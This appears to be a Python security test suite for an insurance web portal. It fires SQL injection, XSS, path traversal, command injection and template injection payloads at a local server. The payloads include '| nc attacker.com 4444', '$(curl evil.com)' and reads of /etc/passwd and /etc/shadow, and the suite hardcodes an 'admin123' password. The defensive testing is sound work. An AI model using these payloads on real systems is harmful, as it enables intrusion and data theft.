"""
Security & Performance Test Suite

Validates security features and performance characteristics:
- Rate limiting (60 requests/minute)
- SQL injection blocking
- XSS prevention
- Path traversal blocking
- Command injection detection
- Malicious payload blocking
- IP blocking after attempts
- Session timeout (3600s)
- Connection timeout (30s)
- Cleanup of stale data
"""

import threading
import time
import json
from http.server import HTTPServer
from urllib.request import urlopen, Request
from urllib.error import HTTPError

import web_portal.server as portal


class ServerThread(threading.Thread):
    """Thread to run the HTTP server in background"""
    def __init__(self, port):
        super().__init__(daemon=True)
        self.port = port
        self.httpd = HTTPServer(('127.0.0.1', port), portal.PortalHandler)

    def run(self):
        self.httpd.serve_forever()

    def stop(self):
        self.httpd.shutdown()


def _get(url, token=None):
    """HTTP GET request"""
    headers = {}
    if token:
        headers['Authorization'] = f'Bearer {token}'
    req = Request(url, headers=headers)
    with urlopen(req) as resp:
        return resp.read().decode('utf-8'), resp.status


def _post(url, payload, token=None):
    """HTTP POST request"""
    data = json.dumps(payload).encode('utf-8')
    headers = {'Content-Type': 'application/json'}
    if token:
        headers['Authorization'] = f'Bearer {token}'
    req = Request(url, data=data, headers=headers)
    with urlopen(req) as resp:
        return resp.read().decode('utf-8'), resp.status


def test_rate_limiting():
    """Test that rate limiting blocks excessive requests"""
    port = 8061
    srv = ServerThread(port)
    srv.start()
    time.sleep(0.2)
    
    base = f"http://127.0.0.1:{port}"
    
    # Clear any existing rate limits by waiting
    time.sleep(1)
    
    # Make requests up to the limit (60 per minute)
    # We'll test with a smaller number to avoid long test times
    success_count = 0
    rate_limited = False
    
    for i in range(65):
        try:
            _get(base + "/api/metrics")
            success_count += 1
        except HTTPError as e:
            if e.code == 429:
                rate_limited = True
                break
    
    # Should hit rate limit before 65 requests
    assert rate_limited, "Rate limiting should trigger"
    assert success_count <= 60, f"Should not exceed 60 requests, got {success_count}"
    
    srv.stop()


def test_sql_injection_blocking():
    """Test SQL injection attempts are blocked"""
    port = 8062
    srv = ServerThread(port)
    srv.start()
    time.sleep(0.2)
    
    base = f"http://127.0.0.1:{port}"
    
    sql_payloads = [
        "' OR '1'='1",
        "1' OR '1' = '1",
        "admin'--",
        "'; DROP TABLE users--",
        "1' UNION SELECT * FROM users--",
        "admin' OR 1=1--"
    ]
    
    for payload in sql_payloads:
        try:
            _post(base + "/api/policies/create", {
                "customer_name": payload,
                "customer_email": "test@example.com",
                "type": "life",
                "coverage_amount": 100000
            })
            # If it doesn't raise an error, check that it was sanitized
            time.sleep(0.1)  # Small delay between requests
        except HTTPError as e:
            # Should be blocked with 400
            assert e.code in [400, 403], f"SQL injection should be blocked, got {e.code}"
    
    srv.stop()


def test_xss_prevention():
    """Test XSS attempts are blocked"""
    port = 8063
    srv = ServerThread(port)
    srv.start()
    time.sleep(0.2)
    
    base = f"http://127.0.0.1:{port}"
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='evil.com'>",
        "<body onload=alert('XSS')>"
    ]
    
    for payload in xss_payloads:
        try:
            _post(base + "/api/policies/create", {
                "customer_name": payload,
                "customer_email": "test@example.com",
                "type": "life",
                "coverage_amount": 100000
            })
            time.sleep(0.1)
        except HTTPError as e:
            # Should be blocked with 400
            assert e.code in [400, 403], f"XSS should be blocked, got {e.code}"
    
    srv.stop()


def test_path_traversal_blocking():
    """Test path traversal attempts are blocked"""
    port = 8064
    srv = ServerThread(port)
    srv.start()
    time.sleep(0.2)
    
    base = f"http://127.0.0.1:{port}"
    
    path_payloads = [
        "../../etc/passwd",
        "..\\..\\windows\\system32",
        "%2e%2e%2fetc%2fpasswd",
        "/etc/shadow"
    ]
    
    for payload in path_payloads:
        try:
            _get(base + f"/api/customer/status?customer_id={payload}")
        except HTTPError as e:
            # Should be blocked
            assert e.code in [400, 403, 404], f"Path traversal should be blocked"
    
    srv.stop()


def test_command_injection_detection():
    """Test command injection attempts are detected"""
    port = 8065
    srv = ServerThread(port)
    srv.start()
    time.sleep(0.2)
    
    base = f"http://127.0.0.1:{port}"
    
    cmd_payloads = [
        "; ls -la",
        "&& cat /etc/passwd",
        "| nc attacker.com 4444",
        "`whoami`",
        "$(curl evil.com)"
    ]
    
    for payload in cmd_payloads:
        try:
            _post(base + "/api/policies/create", {
                "customer_name": f"Test {payload}",
                "customer_email": "test@example.com",
                "type": "life",
                "coverage_amount": 100000
            })
            time.sleep(0.1)
        except HTTPError as e:
            # Should be blocked
            assert e.code in [400, 403], f"Command injection should be blocked"
    
    srv.stop()


def test_malicious_payload_blocking():
    """Test various malicious payloads are blocked"""
    port = 8066
    srv = ServerThread(port)
    srv.start()
    time.sleep(0.2)
    
    base = f"http://127.0.0.1:{port}"
    
    malicious_payloads = [
        "eval()",
        "__import__('os')",
        "open('/etc/passwd')",
        "subprocess.call('ls')",
        "{{7*7}}",  # Template injection
        "<%=system('ls')%>"
    ]
    
    for payload in malicious_payloads:
        try:
            _post(base + "/api/policies/create", {
                "customer_name": payload,
                "customer_email": "test@example.com",
                "type": "life",
                "coverage_amount": 100000
            })
            time.sleep(0.1)
        except HTTPError as e:
            # Should be blocked
            assert e.code in [400, 403], f"Malicious payload should be blocked"
    
    srv.stop()


def test_session_timeout():
    """Test that sessions expire after timeout period"""
    port = 8067
    srv = ServerThread(port)
    srv.start()
    time.sleep(0.2)
    
    base = f"http://127.0.0.1:{port}"
    
    # Login
    body, _ = _post(base + "/api/login", {
        "username": "admin",
        "password": "admin123"
    })
    token = json.loads(body)['token']
    
    # Verify token works
    body, status = _get(base + "/api/profile", token)
    assert status == 200
    
    # Note: Testing actual timeout would take 3600 seconds
    # We just verify the session validation logic exists
    assert 'expires' in str(portal.SESSIONS.get(token, {}))
    
    srv.stop()


def test_security_headers():
    """Test that security headers are set on responses"""
    port = 8068
    srv = ServerThread(port)
    srv.start()
    time.sleep(0.2)
    
    base = f"http://127.0.0.1:{port}"
    
    # Make a request and check headers
    req = Request(base + "/api/metrics")
    with urlopen(req) as resp:
        headers = resp.headers
        
        # Check for security headers
        assert 'X-Content-Type-Options' in headers
        assert headers['X-Content-Type-Options'] == 'nosniff'
        
        assert 'X-Frame-Options' in headers
        assert headers['X-Frame-Options'] in ['DENY', 'SAMEORIGIN']
        
        assert 'X-XSS-Protection' in headers
        assert '1' in headers['X-XSS-Protection']
        
        assert 'Content-Security-Policy' in headers
    
    srv.stop()


def test_failed_login_attempts():
    """Test that failed login attempts are tracked"""
    port = 8069
    srv = ServerThread(port)
    srv.start()
    time.sleep(0.2)
    
    base = f"http://127.0.0.1:{port}"
    
    # Attempt multiple failed logins
    failed_attempts = 0
    for i in range(6):
        try:
            _post(base + "/api/login", {
                "username": "admin",
                "password": f"wrongpassword{i}"
            })
        except HTTPError as e:
            assert e.code == 401
            failed_attempts += 1
        time.sleep(0.1)
    
    assert failed_attempts >= 5, "Should track failed login attempts"
    
    srv.stop()


def test_input_sanitization():
    """Test that dangerous input is sanitized"""
    port = 8070
    srv = ServerThread(port)
    srv.start()
    time.sleep(0.2)
    
    base = f"http://127.0.0.1:{port}"
    
    # Try to create policy with dangerous characters
    body, status = _post(base + "/api/policies/create", {
        "customer_name": "Test<>\"'\\User",
        "customer_email": "test@example.com",
        "type": "life",
        "coverage_amount": 100000
    })
    
    # Should succeed but with sanitized input
    if status == 201:
        data = json.loads(body)
        # Dangerous characters should be removed or escaped
        name = data['customer']['name']
        assert '<' not in name or '>' not in name
    
    srv.stop()


def test_email_validation():
    """Test email validation works correctly"""
    port = 8071
    srv = ServerThread(port)
    srv.start()
    time.sleep(0.2)
    
    base = f"http://127.0.0.1:{port}"
    
    # Test invalid emails
    invalid_emails = [
        "notanemail",
        "@example.com",
        "test@",
        "test..test@example.com",
        "test@example",
        ""
    ]
    
    for email in invalid_emails:
        if not email:
            continue
        try:
            _post(base + "/api/policies/create", {
                "customer_name": "Test User",
                "customer_email": email,
                "type": "life",
                "coverage_amount": 100000
            })
        except HTTPError as e:
            # Invalid emails should be rejected
            assert e.code == 400, f"Invalid email should be rejected: {email}"
    
    srv.stop()


def test_amount_validation():
    """Test monetary amount validation"""
    port = 8072
    srv = ServerThread(port)
    srv.start()
    time.sleep(0.2)
    
    base = f"http://127.0.0.1:{port}"
    
    # Test invalid amounts
    invalid_amounts = [
        -1000,  # Negative
        999999999999,  # Too large (over 100M)
        "not a number"
    ]
    
    for amount in invalid_amounts:
        try:
            _post(base + "/api/policies/create", {
                "customer_name": "Test User",
                "customer_email": "test@example.com",
                "type": "life",
                "coverage_amount": amount
            })
        except HTTPError as e:
            # Invalid amounts should be rejected
            assert e.code == 400, f"Invalid amount should be rejected: {amount}"
    
    srv.stop()


def test_token_validation():
    """Test that invalid tokens are rejected"""
    port = 8073
    srv = ServerThread(port)
    srv.start()
    time.sleep(0.2)
    
    base = f"http://127.0.0.1:{port}"
    
    # Try with invalid token
    try:
        _get(base + "/api/profile", "invalid_token_123")
        assert False, "Invalid token should be rejected"
    except HTTPError as e:
        assert e.code == 401
    
    # Try with token that doesn't start with phins_
    try:
        _get(base + "/api/profile", "wrong_prefix_abc123")
        assert False, "Token without proper prefix should be rejected"
    except HTTPError as e:
        assert e.code == 401
    
    srv.stop()


def test_json_parsing_errors():
    """Test that malformed JSON is handled properly"""
    port = 8074
    srv = ServerThread(port)
    srv.start()
    time.sleep(0.2)
    
    base = f"http://127.0.0.1:{port}"
    
    # Send malformed JSON
    try:
        req = Request(
            base + "/api/login",
            data=b"not valid json{{{",
            headers={'Content-Type': 'application/json'}
        )
        urlopen(req)
        assert False, "Malformed JSON should be rejected"
    except HTTPError as e:
        assert e.code == 400
    
    srv.stop()


def test_missing_required_fields():
    """Test that missing required fields are caught"""
    port = 8075
    srv = ServerThread(port)
    srv.start()
    time.sleep(0.2)
    
    base = f"http://127.0.0.1:{port}"
    
    # Try login without password
    try:
        _post(base + "/api/login", {
            "username": "admin"
        })
        assert False, "Missing password should be rejected"
    except HTTPError as e:
        assert e.code == 400
    
    # Try registration without required fields
    try:
        _post(base + "/api/register", {
            "email": "test@example.com"
        })
        assert False, "Missing required fields should be rejected"
    except HTTPError as e:
        assert e.code == 400
    
    srv.stop()


def test_password_strength_requirements():
    """Test password strength requirements"""
    port = 8076
    srv = ServerThread(port)
    srv.start()
    time.sleep(0.2)
    
    base = f"http://127.0.0.1:{port}"
    
    # Try registration with weak password
    try:
        _post(base + "/api/register", {
            "name": "Test User",
            "email": "weak@example.com",
            "password": "weak",  # Too short
            "phone": "555-1234"
        })
        assert False, "Weak password should be rejected"
    except HTTPError as e:
        assert e.code == 400
    
    srv.stop()


def test_duplicate_prevention():
    """Test duplicate record prevention"""
    port = 8077
    srv = ServerThread(port)
    srv.start()
    time.sleep(0.2)
    
    base = f"http://127.0.0.1:{port}"
    
    # Register user
    _post(base + "/api/register", {
        "name": "Duplicate Test",
        "email": "duplicate@example.com",
        "password": "password123",
        "phone": "555-1234"
    })
    
    # Try to register again with same email
    try:
        _post(base + "/api/register", {
            "name": "Duplicate Test 2",
            "email": "duplicate@example.com",
            "password": "password456",
            "phone": "555-5678"
        })
        assert False, "Duplicate email should be rejected"
    except HTTPError as e:
        assert e.code == 409
    
    srv.stop()


def test_unauthorized_access():
    """Test that unauthorized access to protected endpoints is blocked"""
    port = 8078
    srv = ServerThread(port)
    srv.start()
    time.sleep(0.2)
    
    base = f"http://127.0.0.1:{port}"
    
    protected_endpoints = [
        "/api/profile",
        "/api/audit",
        "/api/security/threats"
    ]
    
    for endpoint in protected_endpoints:
        try:
            _get(base + endpoint)
            # Some endpoints might allow unauthenticated access
            # but return limited data
        except HTTPError as e:
            # Should be 401 Unauthorized
            assert e.code in [401, 403]
    
    srv.stop()


def test_cleanup_functionality():
    """Test that stale data cleanup works"""
    port = 8079
    srv = ServerThread(port)
    srv.start()
    time.sleep(0.2)
    
    base = f"http://127.0.0.1:{port}"
    
    # Create some data
    _post(base + "/api/policies/create", {
        "customer_name": "Cleanup Test",
        "customer_email": "cleanup@example.com",
        "type": "life",
        "coverage_amount": 100000
    })
    
    # Trigger cleanup by making requests
    # (cleanup runs periodically on requests)
    for i in range(5):
        try:
            _get(base + "/api/metrics")
        except:
            pass
        time.sleep(0.1)
    
    # Verify server is still running
    body, status = _get(base + "/api/metrics")
    assert status == 200
    
    srv.stop()
